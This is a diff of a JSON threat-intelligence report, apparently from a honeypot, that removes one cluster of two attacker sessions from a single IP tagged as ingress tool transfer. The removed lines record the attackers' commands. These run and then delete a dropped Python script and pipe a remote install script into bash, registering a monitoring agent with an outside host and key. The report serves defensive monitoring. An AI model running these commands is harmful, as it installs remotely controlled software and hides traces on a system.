@@ -1,58 +1,10 @@
 {
-  "generated_at": "2026-08-04T23:06:36.768275+00:00",
-  "total_sessions_with_commands": 2,
-  "total_clusters": 1,
+  "generated_at": "2026-08-05T02:47:31.154549+00:00",
+  "total_sessions_with_commands": 0,
+  "total_clusters": 0,
   "campaign_clusters": 0,
   "singleton_clusters": 0,
   "highest_severity": "NONE",
   "active_campaigns": [],
-  "clusters": [
-    {
-      "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "165.1.75.106"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
-      "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
-      ],
-      "members": [
-        {
-          "session_id": "IR-c2ec2fdad5f5",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-08-04T22:35:37.144515Z"
-        },
-        {
-          "session_id": "IR-77496d0b4c2a",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-08-04T22:37:58.346417Z"
-        }
-      ]
-    }
-  ]
+  "clusters": []
 }
